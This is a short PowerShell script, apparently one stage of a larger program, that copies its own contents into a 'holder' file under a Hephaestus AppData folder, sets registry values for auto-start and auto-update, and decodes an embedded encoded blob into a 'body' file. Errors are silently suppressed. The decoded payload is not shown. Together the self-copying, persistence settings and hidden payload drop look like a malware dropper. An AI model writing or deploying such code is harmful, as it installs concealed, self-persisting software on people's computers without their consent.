. ./utils.ps1
. ./holder/consts_autoextract.ps1
. ./consts_body.ps1

function checkFolder {
    $appDataFolder = Get-HephaestusFolder
    if (-not (Test-Path -Path $appDataFolder))
    {
        New-Item -Path $appDataFolder -ItemType Directory | Out-Null
    }
}


function extract_holder()
{
    $curScript = Get-ScriptPath
    $holderFile = Get-HolderPath

    try
    {
        $pathOrData = $global:MyInvocation.MyCommand.ScriptContents
        if ($pathOrData.Length -gt 500)
        {
            [System.IO.File]::WriteAllText($holderFile, $pathOrData)
        } 
        else 
        {
            if ($curScript -ne $holderFile)
            {
                Copy-Item -Path $curScript -Destination $holderFile -Force
            }
        } 
    }
    catch
    {
    }
    try 
    {
        RegWriteParamBool -keyName "autoStart" -value $server.autoStart    
        RegWriteParamBool -keyName "autoUpdate" -value $server.autoUpdate
        RegWriteParam -keyName "trackSerie" -value $server.trackSerie
    }
    catch {
      
    }
}

function extract_body()
{
    $holderBodyFile = Get-BodyPath
    if (-not (Test-Path -Path $holderBodyFile))
    {
        CustomDecode -inContent $xbody -outFile $holderBodyFile
    }
}

function Initialization() 
{
    writedbg "holder initialization"
    checkFolder
    extract_holder
    extract_body
}

Initialization
